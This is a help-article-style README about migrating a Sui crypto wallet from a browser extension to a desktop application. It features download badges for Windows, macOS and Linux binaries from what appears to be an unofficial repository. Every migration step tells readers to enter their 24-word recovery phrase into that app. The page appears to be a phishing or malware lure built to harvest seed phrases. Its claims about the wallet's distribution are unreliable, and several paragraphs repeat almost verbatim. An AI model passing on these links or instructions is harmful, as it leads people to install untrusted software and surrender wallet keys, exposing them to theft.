![SUI Wallet](assets/banner-article.png)

# Migrating from a Sui browser wallet to the desktop app

The extension and the desktop app hold the same kind of key; only one of them is a file on your disk.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

There is no extension for this wallet to install: it is a desktop application, and the browser stores have
no listing from this project for it. Moving an account means backing it up as a 24-word phrase in the
extension, restoring that phrase here, and keeping both until the new copy has been checked.

## Why there is no extension to download

The search that brings people here is "sui wallet extension", and the honest answer is that this project
builds a desktop application. Windows, macOS and Linux get a file; a browser gets nothing, and no store
listing belongs to it.

That matters more than a missing convenience. Extensions live inside a browser profile, where any other
extension and any site can ask them to sign. A desktop application signs in its own window, which is why the
distribution choice and the security story are the same choice.

It also explains the search itself. People look for an extension because that is where the account currently lives, and the move being described here is the one that takes it somewhere a page cannot reach into.

## Backing up before anything moves

An account in an extension is a phrase. Find that phrase in the extension's settings, write it on paper, and
check it before going further - a migration that starts with a phrase you have not verified is a migration
that can end with no account at all.

The extension stays installed while you do this. Nothing about the backup changes the original, and both
copies can exist for as long as you want.

If the extension will not show the phrase, the account cannot be moved by this route at all, and the answer is to send the balance to an address created here rather than to keep hunting for a setting.

## Restoring here

Install the current release from the release page, open it, and choose the restore route rather than creating a new account. Enter the 24 words in order, exactly as written, and let the balance arrive from the chain afterwards, rather than expecting the import itself to fetch anything for you.

Two things decide whether this works. The phrase has to be 24 words, because that is what this wallet
derives from, and the account has to be an ordinary one rather than a different kind of account. When both
hold, the address appears and the balance follows from the chain.
[Importing an existing Sui account](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/importing-an-existing-sui-account.md) takes the import step by step, including the 12-word case.

## What does not move

Staking positions, tokens, NFTs and transaction history live on the chain, so they come back with the address without being migrated. What stays behind is local: labels, connected-site permissions and the extension's own settings, none of which belong to the account.

What stays behind is local: the extension's labels, its connected-site permissions, and its own settings.
Those are conveniences attached to one installation, not to the account.
[SUI Wallet shows the wrong address after restore](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/sui-wallet-shows-the-wrong-address.md) is the article to read if the restored address is not the one
you expected, which is the most common outcome of a phrase entered from memory.

## What "Chrome only" means

Some browser wallets say they support one browser, and the phrase confuses people who assume it describes the account. It describes the extension: it installs in that browser and nowhere else. An account has no browser, and a wallet application has a platform.

An account has no browser. A wallet application has a platform. Those are different facts, and the second
one is why a phrase backed up in a browser can be restored into a desktop application with no conversion
step.

## The overlap period

Keep the extension installed and the phrase on paper until the desktop copy has been used at least once:
balance visible, address matching, and a small transaction through if you want certainty. Then decide what
to do with the old installation.

Deleting the extension before the new copy is verified is the one step in this process that cannot be
undone, and it is entirely avoidable.

Two copies of one account are not a problem and not a duplicate balance. Both derive the same address from the same words, and the chain has one record of it; what differs is where the keys are held while you type.

## Which release to migrate to

The current one, because the reported problems are fixed there and an import is where a fixed problem is
most visible. The [repository](https://github.com/sui-blockchain-wallet/sui-wallet-desktop) records the
changes between releases, and the order of install, restore and verify is the same on every platform.

## FAQ

### How do I move my accounts from a browser wallet to SUI Wallet?

Back up each account as a 24-word phrase in the extension, install the desktop release, restore the phrase
there, and keep both copies until the address and balance match.

### How do I download the SUI Wallet extension?

There is none from this project. The wallet is a desktop application for Windows, macOS and Linux, and the
browser stores carry no listing from it.

### What does "Chrome only" mean for a Sui wallet?

That a particular extension installs in one browser. The account itself is not tied to a browser, which is
why it can be restored into a desktop application.

### Multiple accounts - can I move all of them?

Yes, one phrase at a time. Each account has its own 24 words and its own restore, and the wallet keeps them
side by side afterwards.

### Will my staking move with the account?

It does not need to. The staked position belongs to the address, so it is already there when the phrase is
restored on the current release.

### Can I keep using both?

Yes. The same phrase can exist in two places, and both produce the same address. That is also the argument
for paper: it is the copy nothing can phish.
